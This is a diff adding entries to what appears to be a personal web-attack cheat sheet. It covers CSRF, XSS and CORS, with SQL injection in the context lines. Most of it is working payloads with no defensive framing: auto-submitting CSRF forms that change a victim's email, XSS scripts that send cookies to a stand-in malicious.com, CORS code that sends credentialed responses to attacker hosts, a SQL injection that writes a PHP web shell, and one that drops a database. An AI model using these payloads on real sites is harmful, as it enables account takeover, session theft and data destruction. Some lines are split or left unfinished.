@@ -137,3 +137,90 @@ SQL Injection:
 	- UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php'--
 	- In a password change field 
 		- UPDATE users SET password='67890' WHERE username = 'Chotu'; DROP DATABASE database-name-- ' AND password='12345'
+		
+CSRF:
+	- <img src="https://vulnerable.com/change-email?email=attacker@evil.com">
+	- <form action="http://localhost:30000/updateEmail/" method="POST">
+	<input type="hidden" name="csrftoken" value="adf84b8fcc83a953c670cadc02d5a823ce59a3d729cec674dd6e6828301e2458">
+	<input type="hidden" name="new_email" value="attacker@example.com">
+	</form> 
+
+	<script>
+	document.forms[0].submit();
+	</script>
+	
+	- <script>document.cookie = "csrftoken=123456789; path=/"</script>
+
+	<form action="http://localhost:30000/updateEmail/" method="POST">
+	 <input type="hidden" name="new_email" value="attacker@example.com">
+	<input type="hidden" name="csrftoken" value="123456789">
+	</form>
+
+	<script>
+	  document.forms[0].submit();
+	</script>
+	
+	- <form action="https://vulnerable.com/my-account/change-email" method="POST">
+	<input type="hidden" name="email" value="attacker@evil.com" />
+	<input required type="hidden" name="csrf"
+	value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u" />
+	<input type="submit" value="Update Email" />
+	</form>
+	<img src="https://vulnerable.com/?search=%0d%0aSet-Cookie:%20csrfKey
+	 = 50FaWgdOhi9M9wyna8taR1k3ODOR8d6u %3b%20S
+	 
+	 - Send POST as GET
+	 <script>
+	 document.location =
+	 "https://vulnerable.com/my-account/change-email?email=user@example.com&_method=POST";
+	 </script>
+	 
+	 - diff directory
+	 <script>
+	document.location =
+	"https://vulnerable.com/fill/comment/thankyou?
+	videoId=1/../../my-account/change-email?email=
+	user%40example.com";
+	</script>
+	
+XSS:
+	- <script>
+	document.location = "http://www.malicious.com/
+	steal.php?cookie="+document.cookie;
+	</script>
+	
+	- <script>
+	img = new Image();
+	img.src = "http://www.malicious.com/steal.php?cookie=" + document.cookie;
+	</script>
+	
+	- &lt;script&gt; alert(1) &lt;/script&gt;
+	
+	- http://victimsite.com/search.php?query=
+	<script>document.location=“http://malicious.com/steal.php?cookie=“
+	+document.cookie</script>
+	
+CORS:
+	- var xhr = new XMLHttpRequest();
+	xhr.onload = function() {
+	if (xhr.responseText.trim() !== '') {
+	window.location.href =
+	'//attacker-website.com/log?data=' +
+	encodeURIComponent(xhr.responseText);
+	}
+	};
+	xhr.open('GET', 'https://vulnerable.com/data', true);
+	xhr.withCredentials = true;
+	xhr.send();
+	
+	- where xss vuln exists
+	<script>
+	document.location="http://subdo	main.vulnerable.com/?productId=<s
+	cript>var req = new XMLHttpRequest(); req.onload = reqListener;
+	req.open('get','https://cross-origin-server.com/accountDetails',true
+	); req.withCredentials = true;req.send();function reqListener()
+	{location='https://attacker.com/log?key='+this.responseText;
+	};</script>"
+	</script>
+	
+	- Access-Control-Allow-Origin: *
